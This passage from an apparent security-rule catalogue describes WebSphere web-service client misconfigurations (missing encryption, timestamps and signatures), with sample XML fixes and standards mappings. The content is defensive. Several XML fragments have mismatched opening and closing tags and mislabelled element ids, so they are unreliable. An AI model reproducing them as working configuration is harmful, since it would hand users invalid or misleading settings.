<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1152150778436&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityResponseConsumerServiceConfig xmi:id=&quot;SecurityResponseConsumerServiceConfig_1212093287097&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;requiredConfidentiality xmi:id=&quot;Integrity_1212093287097&quot; name=&quot;int1&quot; order=&quot;1&quot;&gt;</span><br><span class="line"></span><br><span class="line">          ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-229"><a href="#REFERENCES-229" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Requester-Misconfiguration-Missing-Inbound-Encryption-1"><a href="#WebSphere-Service-Requester-Misconfiguration-Missing-Inbound-Encryption-1" class="headerlink" title="WebSphere Service Requester Misconfiguration: Missing Inbound Encryption"></a>WebSphere Service Requester Misconfiguration: Missing Inbound Encryption</h4><h5 id="ABSTRACT-231"><a href="#ABSTRACT-231" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未加密的消息无法保护其保密性。</p>
<h5 id="EXPLANATION-232"><a href="#EXPLANATION-232" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SOAP 消息级加密可确保真正的端到端保密性。可通过多种传输协议发送 SOAP 消息，例如 HTTPS、HTTP、TCP、SMTP、UDP 等。无论采用哪种传输协议，消息级加密都可确保消息的保密性。Web 服务之间的常见传送情形是在各种服务之间转发 SOAP 消息，因此通过消息级加密，消息发送者和接收者均无需担忧中继点之间的传输安全问题。</p>
<h5 id="RECOMMENDATIONS-231"><a href="#RECOMMENDATIONS-231" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果服务提供程序提供支持，则将客户端配置为接受输入的消息并对其进行解密。通过启用“响应用户服务”配置中的保密性，便可完成此配置。</p>
<p>下面提供了 WebSphere 配置示例，将对输入的消息进行加密：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1152150778436&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityResponseConsumerServiceConfig xmi:id=&quot;SecurityResponseConsumerServiceConfig_1212093287097&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;requiredConfidentiality xmi:id=&quot;Integrity_1212093287097&quot; name=&quot;int1&quot; order=&quot;1&quot;&gt;</span><br><span class="line"></span><br><span class="line">          ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-230"><a href="#REFERENCES-230" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Requester-Misconfiguration-Missing-Inbound-Timestamp"><a href="#WebSphere-Service-Requester-Misconfiguration-Missing-Inbound-Timestamp" class="headerlink" title="WebSphere Service Requester Misconfiguration: Missing Inbound Timestamp"></a>WebSphere Service Requester Misconfiguration: Missing Inbound Timestamp</h4><h5 id="ABSTRACT-232"><a href="#ABSTRACT-232" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若缺少时间戳，会导致 SOAP 消息遭受 replay 攻击。</p>
<h5 id="EXPLANATION-233"><a href="#EXPLANATION-233" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<h5 id="RECOMMENDATIONS-232"><a href="#RECOMMENDATIONS-232" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果服务提供程序提供支持，则将客户端配置为要求输入的响应中具有时间戳。</p>
<p>下列 WebSphere 配置要求输入的响应中具有时间戳：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1152150778436&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityResponseConsumerServiceConfig xmi:id=&quot;SecurityResponseConsumerServiceConfig_1212093287097&quot;&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;addTimestamp xmi:id=&quot;AddTimestamp_1212093287097&quot; expires=&quot;P3Y0M0DT4H0M0.0S&quot;/&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wscext:WsClientExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-231"><a href="#REFERENCES-231" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3870 CAT I, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3870 CAT I, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3870 CAT I, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3870 CAT I, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3870 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3870 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Requester-Misconfiguration-Missing-Outbound-Encryption"><a href="#WebSphere-Service-Requester-Misconfiguration-Missing-Outbound-Encryption" class="headerlink" title="WebSphere Service Requester Misconfiguration: Missing Outbound Encryption"></a>WebSphere Service Requester Misconfiguration: Missing Outbound Encryption</h4><h5 id="ABSTRACT-233"><a href="#ABSTRACT-233" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未加密的消息无法保护其保密性。</p>
<h5 id="EXPLANATION-234"><a href="#EXPLANATION-234" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SOAP 消息级加密可确保真正的端到端保密性。可通过多种传输协议发送 SOAP 消息，例如 HTTPS、HTTP、TCP、SMTP、UDP 等。无论采用哪种传输协议，消息级加密都可确保消息的保密性。Web 服务之间的常见传送情形是在各种服务之间转发 SOAP 消息，因此通过消息级加密，消息发送者和接收者均无需担忧中继点之间的传输安全问题。</p>
<h5 id="RECOMMENDATIONS-233"><a href="#RECOMMENDATIONS-233" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果服务提供程序提供支持，则将客户端配置为对输出的消息进行加密。通过启用“请求生成器服务”配置中的保密性，便可完成此配置。</p>
<p>下面提供了 WebSphere 配置示例，将对输出的请求进行加密：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1152150778436&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestGeneratorServiceConfig xmi:id=&quot;SecurityRequestGeneratorServiceConfig_1212078169562&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;confidentiality xmi:id=&quot;Integrity_1212093287097&quot; name=&quot;int1&quot; order=&quot;1&quot;&gt;</span><br><span class="line"></span><br><span class="line">          ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-232"><a href="#REFERENCES-232" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Requester-Misconfiguration-Missing-Outbound-Signature"><a href="#WebSphere-Service-Requester-Misconfiguration-Missing-Outbound-Signature" class="headerlink" title="WebSphere Service Requester Misconfiguration: Missing Outbound Signature"></a>WebSphere Service Requester Misconfiguration: Missing Outbound Signature</h4><h5 id="ABSTRACT-234"><a href="#ABSTRACT-234" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>缺少签名意味着无法保证 SOAP 消息的完整性。</p>
<h5 id="EXPLANATION-235"><a href="#EXPLANATION-235" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>消息中任何未经签名的部分，都可能在发送者或接收者未察觉的情况下被截取和修改。没有签名，接收者就无法借助密码来验证消息内容来自真正的发送者。</p>
<h5 id="RECOMMENDATIONS-234"><a href="#RECOMMENDATIONS-234" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为对输入的请求验证签名。</p>
<p>下列客户端配置可让 IBM WebSphere 对输出的请求进行签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1152150778436&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestGeneratorServiceConfig xmi:id=&quot;SecurityRequestGeneratorServiceConfig_1212078169562&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;integrity xmi:id=&quot;Integrity_1212094108000&quot; name=&quot;int1&quot; order=&quot;1&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;messageParts xmi:id=&quot;MessageParts_1212094108000&quot; Dialect=&quot;http://www.ibm.com/websphere/webservices/wssecurity/dialect-was&quot; keyword=&quot;body&quot;/&gt;</span><br><span class="line"></span><br><span class="line">            &lt;nonce xmi:id=&quot;Nonce_1212094108000&quot; Dialect=&quot;http://www.ibm.com/websphere/webservices/wssecurity/dialect-was&quot; keyword=&quot;body&quot;/&gt;</span><br><span class="line"></span><br><span class="line">          &lt;/integrity&gt;</span><br><span class="line"></span><br><span class="line">          ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wscext:WsClientExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-233"><a href="#REFERENCES-233" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
